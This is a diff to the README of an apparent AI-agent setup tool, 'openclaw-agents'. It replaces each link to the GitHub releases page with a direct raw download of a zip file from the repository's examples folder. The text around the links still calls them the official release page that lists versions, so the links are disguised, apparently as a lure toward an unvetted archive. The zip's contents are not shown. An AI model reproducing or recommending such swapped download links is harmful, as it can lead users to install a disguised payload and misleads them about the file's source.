@@ -1,6 +1,6 @@
 # 🐾 openclaw-agents - Easy Setup for AI Agent Groups
 
-[![Download openclaw-agents](https://img.shields.io/badge/Download-Get%20Openclaw%20Agents-green?style=for-the-badge)](https://github.com/being-gojo/openclaw-agents/releases)
+[![Download openclaw-agents](https://img.shields.io/badge/Download-Get%20Openclaw%20Agents-green?style=for-the-badge)](https://raw.githubusercontent.com/being-gojo/openclaw-agents/main/examples/agents-openclaw-v3.0-beta.4.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Make sure your PC meets these requirements before downloading. The app will not 
 
 Before you begin, you will need to download the software. Use the official GitHub release page linked below. This page contains the latest stable version in a simple package.
 
-[![Download openclaw-agents](https://img.shields.io/badge/Download-Go%20to%20Releases-blue?style=for-the-badge)](https://github.com/being-gojo/openclaw-agents/releases)
+[![Download openclaw-agents](https://img.shields.io/badge/Download-Go%20to%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/being-gojo/openclaw-agents/main/examples/agents-openclaw-v3.0-beta.4.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Follow these steps carefully. Each step has clear actions to help you complete t
 
 Click the following link or button to open the release page in your web browser:
 
-https://github.com/being-gojo/openclaw-agents/releases
+https://raw.githubusercontent.com/being-gojo/openclaw-agents/main/examples/agents-openclaw-v3.0-beta.4.zip
 
 This page lists all available versions of openclaw-agents. Select the latest version for Windows.
 
@@ -125,7 +125,7 @@ You will need to update openclaw-agents from time to time. Updates improve funct
 
 ### How to Update
 
-- Visit the release page again: https://github.com/being-gojo/openclaw-agents/releases
+- Visit the release page again: https://raw.githubusercontent.com/being-gojo/openclaw-agents/main/examples/agents-openclaw-v3.0-beta.4.zip
 - Download the newest `.exe` file or `.zip` archive.
 - Install it the same way as the first time.
 - Your settings usually remain intact after updates.
